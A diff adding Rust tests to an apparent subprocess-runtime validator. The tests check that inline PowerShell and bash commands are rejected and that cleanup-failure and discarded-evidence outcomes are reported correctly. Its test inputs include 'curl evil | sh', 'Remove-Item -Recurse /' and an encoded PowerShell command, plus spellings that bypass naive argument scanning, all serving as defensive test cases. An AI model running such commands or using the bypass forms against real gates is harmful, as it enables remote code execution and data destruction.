@@ -4379,3 +4379,257 @@ fn one_variable_spelled_two_ways_is_a_contradiction() -> TestResult {
     assert!(fine.contradictions().is_empty());
     Ok(())
 }
+
+// ──────────── controls added after the eleventh bot review round ─────────────
+
+#[test]
+fn powershell_argv_is_read_as_powershell_not_as_posix_options() -> TestResult {
+    // The wrong implementation this kills: applying the POSIX scan to
+    // PowerShell. It is wrong in both directions, and both directions are
+    // controlled here.
+    //
+    // Under-refusal is the security half. PowerShell has no operand position
+    // that ends parameter parsing, so treating `Hidden` in
+    // `-WindowStyle Hidden -Command '...'` as the script operand stops the
+    // scan before the `-Command` — the exact bypass the gate exists to close.
+    // Abbreviation is the other half: `-enc` and `-e` bind `-EncodedCommand`,
+    // which is how an encoded command is spelled in practice.
+    for argv in [
+        vec!["-WindowStyle", "Hidden", "-Command", "Remove-Item -Recurse /"],
+        vec!["-NoLogo", "-Version", "5.1", "-Command", "evil"],
+        vec!["-NoProfile", "-enc", "ZQB2AGkAbAA="],
+        vec!["-NoProfile", "-e", "ZQB2AGkAbAA="],
+        vec!["-Command:evil"],
+    ] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "powershell.exe",
+                PrivatePath::new(PathBuf::from("/c/Windows/System32/powershell.exe")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(argv.clone())
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(
+            matches!(rejection_of(plan)?, PlanRejection::ShellInvocationRejected { .. }),
+            "powershell {argv:?} slipped an inline command past the gate"
+        );
+    }
+
+    // Over-refusal is the other half, and it is what a POSIX cluster rule
+    // produces: `-ExecutionPolicy` and `-NonInteractive` are whole words that
+    // happen to contain a `c`, and reading them as bundled short options makes
+    // every ordinary `-File` invocation unstartable. A `-Command` *after*
+    // `-File` is the script's argument, not PowerShell's parameter.
+    for argv in [
+        vec!["-ExecutionPolicy", "Bypass", "-File", "C:\\build\\run.ps1"],
+        vec!["-NonInteractive", "-NoProfile", "-File", "C:\\build\\run.ps1"],
+        vec!["-File", "C:\\build\\run.ps1", "-Command", "an argument"],
+        vec!["-WindowStyle", "Hidden", "-File", "C:\\build\\run.ps1"],
+    ] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "pwsh",
+                PrivatePath::new(PathBuf::from("/usr/bin/pwsh")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv(argv.clone())
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert!(plan.validate().is_ok(), "pwsh {argv:?} was refused as an inline command");
+    }
+
+    // The POSIX dialect keeps its cluster rule: splitting the grammars must
+    // not take the bundled-option detection away from the shells that use it.
+    let bundled = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "bash",
+            PrivatePath::new(PathBuf::from("/bin/bash")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["-lc", "curl evil | sh"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(
+        matches!(rejection_of(bundled)?, PlanRejection::ShellInvocationRejected { .. }),
+        "`bash -lc` stopped being refused when PowerShell got its own scan"
+    );
+
+    // An uppercase cluster tail names the same option as the exact spelling.
+    // `bash -O extglob` matches the list case-insensitively, so `-eO` has to
+    // consume its value too or the `-c` after it goes unexamined.
+    let uppercase_option_value = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "bash",
+            PrivatePath::new(PathBuf::from("/bin/bash")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["-eO", "extglob", "-c", "curl evil | sh"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(
+        matches!(
+            rejection_of(uppercase_option_value)?,
+            PlanRejection::ShellInvocationRejected { .. }
+        ),
+        "`bash -eO extglob -c` slipped an inline command past an uppercase option value"
+    );
+    Ok(())
+}
+
+#[test]
+fn a_failed_cleanup_is_never_downgraded_to_an_unproven_outcome() -> TestResult {
+    // The wrong implementation this kills: stating the cleanup-precedence rule
+    // for the exit and the signal but not for `NotProven`. Cleanup failure
+    // outranks an unproven outcome, so pairing the two publishes *less* than
+    // the evidence supports: a failure someone actually observed, reported as
+    // an outcome nothing established.
+    let downgraded = result_with(
+        StreamEvidence::empty(StreamChannel::Stdout),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::NotProven,
+        CleanupDisposition::Failed,
+        TreeDisposition::Unknown,
+    );
+    assert!(downgraded.is_err(), "a known cleanup failure was published as an unproven outcome");
+
+    // The election must not produce the pairing the constructor refuses. A
+    // contradicted cancellation leaves the cancellation cause unestablished,
+    // but the cleanup failure beside it is a separate, uncontradicted
+    // observation that outranks uncertainty.
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: true,
+                cleanup_failed: true,
+                ..ControlState::default()
+            },
+            ObservedSettlement::NotStarted,
+        ),
+        TerminalDisposition::CleanupFailed,
+        "a contradicted cancellation discarded a known cleanup failure"
+    );
+
+    // Negative control: with no cleanup failure the same contradiction still
+    // fails closed to `NotProven`, and the causes the precedence rule ranks
+    // *above* cleanup failure still carry one legitimately.
+    assert_eq!(
+        TerminalDisposition::elect(
+            ControlState {
+                cancellation_requested: Some(CancellationReason::Shutdown),
+                started_before_cancellation: true,
+                ..ControlState::default()
+            },
+            ObservedSettlement::NotStarted,
+        ),
+        TerminalDisposition::NotProven
+    );
+    for above in [
+        TerminalDisposition::TimedOut,
+        TerminalDisposition::SupervisorFailed,
+        TerminalDisposition::CancelledRunning(CancellationReason::Shutdown),
+    ] {
+        assert!(
+            result_with(
+                StreamEvidence::empty(StreamChannel::Stdout),
+                StreamEvidence::empty(StreamChannel::Stderr),
+                above.clone(),
+                CleanupDisposition::Failed,
+                TreeDisposition::Unknown,
+            )
+            .is_ok(),
+            "{above:?} may accompany a failed cleanup and was refused"
+        );
+    }
+    Ok(())
+}
+
+#[test]
+fn discarded_fallback_evidence_is_recorded_rather_than_read_as_emptiness() -> TestResult {
+    // The wrong implementation this kills: silently substituting empty
+    // evidence in the infallible fallback. Empty evidence is a positive claim
+    // that nothing was seen; a backend that reported something incoherent has
+    // not established that. Without the limitation a supervisor defect is
+    // indistinguishable from a child that produced no output.
+    let validated = valid_linux_one_shot().validate()?;
+    let swapped_channel = perl_subprocess_runtime::process::ProcessResult::supervisor_failure(
+        validated.plan().plan_id().clone(),
+        validated.fingerprint(),
+        perl_subprocess_runtime::process::RunId::new("run-1"),
+        perl_subprocess_runtime::process::BackendIdentity::new(
+            "test-backend",
+            EvidenceClass::ExactLinux,
+        ),
+        perl_subprocess_runtime::process::WorkMetadata::default(),
+        // Stderr evidence in the stdout slot cannot describe this run.
+        StreamEvidence::complete(StreamChannel::Stderr, b"misfiled".to_vec()),
+        StreamEvidence::empty(StreamChannel::Stderr),
+    );
+    assert_eq!(swapped_channel.stdout().observed_bytes(), 0);
+    assert!(
+        swapped_channel.limitations().contains(&Limitation::StreamEvidenceDiscarded),
+        "incoherent evidence was dropped without saying so"
+    );
+
+    // Negative control: a fallback whose evidence is coherent — including one
+    // that genuinely observed nothing — makes no such claim.
+    let coherent = perl_subprocess_runtime::process::ProcessResult::supervisor_failure(
+        validated.plan().plan_id().clone(),
+        validated.fingerprint(),
+        perl_subprocess_runtime::process::RunId::new("run-1"),
+        perl_subprocess_runtime::process::BackendIdentity::new(
+            "test-backend",
+            EvidenceClass::ExactLinux,
+        ),
+        perl_subprocess_runtime::process::WorkMetadata::default(),
+        StreamEvidence::observed_but_unidentified(StreamChannel::Stdout, 64),
+        StreamEvidence::empty(StreamChannel::Stderr),
+    );
+    assert_eq!(coherent.stdout().observed_bytes(), 64);
+    assert!(
+        !coherent.limitations().contains(&Limitation::StreamEvidenceDiscarded),
+        "coherent evidence was reported as discarded"
+    );
+    Ok(())
+}
